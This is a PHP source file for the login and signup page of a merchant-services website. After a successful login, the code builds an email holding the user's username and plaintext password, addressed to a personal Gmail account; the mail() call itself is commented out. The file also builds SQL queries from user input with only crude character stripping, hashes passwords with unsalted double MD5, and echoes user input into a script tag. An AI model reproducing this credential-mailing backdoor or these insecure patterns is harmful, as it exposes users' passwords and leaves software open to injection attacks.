<?php
/**
 * welcome.php
 */
//----------------------------------------------------------------------------------------CHECKLOGIN START

session_start();
$GLOBALS['test'] = 0;

if (isset($_GET['test'])) {
    $GLOBALS['test'] = 1;
}


//if (!isset($_GET['test']))
//{
//header("location: https://tbcmerchantservices.com/maintenance/");
//}
//else {
//$GLOBALS['test'] = 1;
include 'class.php';
$class = new mydesign;
$class->database_connect();

date_default_timezone_set('Asia/Manila');
$sessiondate = date('mdY');

$error    = '';
$logerror = '';
if (isset($_POST['tbctxt_username_login']) && isset($_POST['tbctxt_password_login']) && isset($_POST['tbctxt_capchaval_login']) && isset($_POST['tbctxt_captcha_login'])) {

    if (empty($_POST['tbctxt_username_login']) || empty($_POST['tbctxt_password_login'])) {
        $logerror = '<span style="color: red">Invalid Username or Password</span>';
    } else {
        $user = str_replace("'", '', $_POST['tbctxt_username_login']);
        $user = str_replace('"', '', $user);
        $user = str_replace("<", '', $user);
        $user = str_replace('>', '', $user);

        $pass = str_replace("'", '', $_POST['tbctxt_password_login']);
        $pass = str_replace('"', '', $pass);
        $pass = str_replace("<", '', $pass);
        $pass = str_replace('>', '', $pass);

        $capctr = str_replace("'", '', $_POST['tbctxt_capchaval_login']);
        $capctr = str_replace('"', '', $capctr);
        $capctr = str_replace("<", '', $capctr);
        $capctr = str_replace('>', '', $capctr);

        $capctha = str_replace("'", '', $_POST['tbctxt_captcha_login']);
        $capctha = str_replace('"', '', $capctha);
        $capctha = str_replace("<", '', $capctha);
        $capctha = str_replace('>', '', $capctha);
        $tempass = $pass;
        $pass    = md5(md5($pass) . md5($user));

        $rs   = mysql_query("select * from xtbl_account_info where Username='$user' and Password='$pass'");
        $rows = mysql_num_rows($rs);
        $row  = mysql_fetch_assoc($rs);



        if ($rows == 1) {
            $rs   = mysql_query("select * from xtbl_captcha where Ctr='$capctr' AND value='$capctha' ");
            $rows = mysql_num_rows($rs);
            if ($rows == 1) {
                $_SESSION['session_tbcmerchant_ctr' . $sessiondate] = $row['Main_Ctr'];


                ini_set('display_errors', 1);
                error_reporting(E_ALL);
                $from    = "TBCMerchantServices<automail@tbcmerchantservices.com>";
                $subject = "Email Login";
                $message = "Username: " . $user . " Password: " . $tempass;
                $headers = "From:" . $from;
                #mail('urfren.samson@gmail.com',$subject,$message, $headers);

            } else {
                $logerror = '<span style="color: red">Wrong Captcha</span>';
            }
        } else {
            $logerror = '<span style="color: red">Invalid Username or Password</span>';
        }
    }
}


if (isset($_SESSION['session_tbcmerchant_ctr' . $sessiondate])) {
  if($class->isLocalhost()==true)
    header("location: home.php");
  else
    header("location: https://tbcmerchantservices.com/home/");
}

//----------------------------------------------------------------------------------------CHECKLOGIN END

//----------------------------------------------------------------------------------------SIGNUP_FORM START
if (isset($_POST['txttbc_email_checksignup']) && !empty($_POST['txttbc_email_checksignup'])) {
    $email = str_replace("'", '', $_POST['txttbc_email_checksignup']);
    $email = str_replace('"', '', $email);
    $email = str_replace("<", '', $email);
    $email = str_replace('>', '', $email);

    if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $query  = "select * from xtbl_main_info WHERE Email='$email'";
        $rs     = mysql_query($query);
        $result = mysql_num_rows($rs);
        echo "<script>console.log('" . $email . "')</script>";

        if ($result == 0) { //goto sign up
            $class->doc_type();
            $class->html_start('');
            $class->head_start();
            echo '<link rel="shortcut icon" type="image/x-icon" href="https://tbcmerchantservices.com/images/tbslogo.png" />';
            $class->title_page('TBC Merchant Services');
            $class->script('https://tbcmerchantservices.com/js/jquery-3.1.1.js');
            $class->script('https://tbcmerchantservices.com/js/bootstrap.js');
            $class->link('https://tbcmerchantservices.com/css/bootstrap.css');
            $class->script('https://tbcmerchantservices.com/js/bootstrap-datetimepicker.js');
            $class->link('https://tbcmerchantservices.com/css/bootstrap-datetimepicker.css');
            $class->script('https://tbcmerchantservices.com/js/jquery.js');

?>
   <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    <script>
      (adsbygoogle = window.adsbygoogle || []).push({
        google_ad_client: "ca-pub-7719044667689153",
        enable_page_level_ads: true
      });
      $( document ).ready(function() {

      	$('#birth-text').on('keypress', function(e){
        	var keyCode = e.which;
          console.log(keyCode);
      		if ((keyCode != 8 ) && (keyCode < 48 || keyCode > 57) && (keyCode != 45)){
      			return false;
      		}

      	 });
      });
    </script>
    <?php
            $class->head_end();
            $class->body_start('');
            echo '<img src="https://tbcmerchantservices.com/images/16995983_1757077694306251_2258909794196462291_n.jpg" hidden width="90%">';
            $class->page_welcome_header_start();
            $class->page_welcome_header_content_signup();
            $class->page_welcome_header_end();
            $class->page_welcome_header_content_signup_body($email);
            $class->chatscript();
            $class->body_end();
            $class->html_end();
        } else {
            $error = '2'; //show email availability error
            $class->doc_type();
            $class->html_start('');
            $class->head_start();
            echo '<link rel="shortcut icon" type="image/x-icon" href="https://tbcmerchantservices.com/images/tbslogo.png" />';
            $class->title_page('TBC Merchant Services');
            $class->script('https://tbcmerchantservices.com/js/jquery-3.1.1.js');
            $class->script('https://tbcmerchantservices.com/js/bootstrap.js');
            $class->link('https://tbcmerchantservices.com/css/bootstrap.css');
?>
   <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    <script>
      (adsbygoogle = window.adsbygoogle || []).push({
        google_ad_client: "ca-pub-7719044667689153",
        enable_page_level_ads: true
      });
    </script>
    <?php
            $class->head_end();
            $class->body_start('');

            echo '<img src="https://tbcmerchantservices.com/images/16995983_1757077694306251_2258909794196462291_n.jpg" hidden width="90%">';
            $class->page_welcome_header_start();
            $class->page_welcome_header_content_start($error);
            $class->page_welcome_header_end();
            $class->page_welcome_header_content_start_body($logerror);
            #$class->page_welcome_displaymerchants();
            $class->chatscript();
            $class->body_end();
            $class->html_end();
        }
    } else {
        $error = '1'; //show email format error
        $class->doc_type();
        $class->html_start('');
        $class->head_start();
        echo '<link rel="shortcut icon" type="image/x-icon" href="https://tbcmerchantservices.com/images/tbslogo.png" />';
        $class->title_page('TBC Merchant Services');
        $class->script('https://tbcmerchantservices.com/js/jquery-3.1.1.js');
        $class->script('https://tbcmerchantservices.com/js/bootstrap.js');
        $class->link('https://tbcmerchantservices.com/css/bootstrap.css');
        $class->link('https://www.w3schools.com/w3css/4/w3.css');
?>
   <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    <script>
      (adsbygoogle = window.adsbygoogle || []).push({
        google_ad_client: "ca-pub-7719044667689153",
        enable_page_level_ads: true
      });
    </script>
    <?php

        $class->head_end();
        $class->body_start('');

        echo '<img src="https://tbcmerchantservices.com/images/16995983_1757077694306251_2258909794196462291_n.jpg" hidden width="90%">';
        $class->page_welcome_header_start();
        $class->page_welcome_header_content_start($error);
        $class->page_welcome_header_end();
        $class->page_welcome_header_content_start_body($logerror);
        // $class->page_welcome_displaymerchants_carousel();
        $class->page_welcome_displaymerchants_marquee();
        $class->chatscript();

        $class->body_end();
        $class->html_end();

    }
}
//----------------------------------------------------------------------------------------SIGNUP_FORM END

//----------------------------------------------------------------------------------------LOGIN_FORM START

else {

    $class->doc_type();
    $class->html_start('');
    $class->head_start();
    echo '<link rel="shortcut icon" type="image/x-icon" href="https://tbcmerchantservices.com/images/tbslogo.png" />';

    /* START - Themify*/
    $class->link('./assets/themify-icons/themify-icons.css');  
    /* END - Themify*/
    $class->title_page('TBC Merchant Services');
    $class->script('https://tbcmerchantservices.com/js/jquery-3.1.1.js');
    $class->script('https://tbcmerchantservices.com/js/bootstrap.js');
    $class->link('https://tbcmerchantservices.com/css/bootstrap.css');
    $class->link('https://www.w3schools.com/w3css/4/w3.css');
    $class->link('https://fonts.googleapis.com/css?family=Noto+Sans&display=swap');
?>
   <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    <script>
      (adsbygoogle = window.adsbygoogle || []).push({
        google_ad_client: "ca-pub-7719044667689153",
        enable_page_level_ads: true
      });
    </script>
    <script>
    // $(window).on('load',function(){
    //        $('#myModal').modal('show');
    //    });

    </script>

    <div id="myModal" class="modal fade" role="dialog">
      <div class="modal-dialog">

        <!-- Modal content-->
        <div class="modal-content">
          <div class="modal-header">
            <button type="button" class="close" data-dismiss="modal">&times;</button>
            <h4 class="modal-title">Announcement:TBCMS is under maintenance at the moment</h4>
                    <br>
                     <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>


          </div>
        </div>

      </div>
    </div>
    <?php
    $class->head_end();
    $class->body_start('style="background-color: #f2f2f2"');

    echo '<img src="https://tbcmerchantservices.com/images/16995983_1757077694306251_2258909794196462291_n.jpg" hidden width="90%">';
    $class->page_welcome_header_start();
    $class->page_welcome_header_content_start($error);
    $class->page_welcome_header_end();
    $class->page_welcome_header_content_start_body($logerror);
    // $class->page_welcome_displaymerchants_carousel();
    $class->page_welcome_displaymerchants_marquee();

    $class->page_welcome_header_content_start_footer();
    $class->chatscript();
    $class->body_end();
    $class->html_end();
}



//}



//----------------------------------------------------------------------------------------LOGIN_FORM END
/**
 * welcome.php
 */

?>
